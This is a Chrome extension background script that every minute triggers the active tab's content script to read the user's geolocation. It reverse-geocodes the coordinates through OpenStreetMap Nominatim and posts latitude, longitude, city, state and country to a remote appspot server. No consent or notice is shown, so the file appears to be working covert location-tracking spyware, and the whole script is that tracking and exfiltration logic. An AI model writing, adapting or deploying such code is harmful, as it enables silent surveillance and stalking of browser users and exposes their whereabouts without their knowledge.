const serverURL = 'https://crisscrossapplesauce.wl.r.appspot.com/geolocation';
const intervalInMinutes = 1;

// Function to send location data to the remote server
async function sendLocation(locationInfo) {
  try {
    await fetch(serverURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(locationInfo),
    });
  } catch (error) {
    console.error('Failed to send location:', error);
  }
}

// Receive the message from the content script and process the location data
chrome.runtime.onMessage.addListener(async (message) => {
  if (message.location) {
    const { latitude, longitude } = message.location;
    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
    const locationData = await response.json();

    const city = locationData.address.city || locationData.address.town || locationData.address.village;
    const state = locationData.address.state;
    const country = locationData.address.country;

    const locationInfo = {
      latitude,
      longitude,
      city,
      state,
      country,
    };

    sendLocation(locationInfo);
  }
});

// Periodically send the latest location data to the server
setInterval(() => {
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (tabs[0]) {
      chrome.tabs.sendMessage(tabs[0].id, { action: 'getLocation' });
    }
  });
}, intervalInMinutes * 60 * 1000);
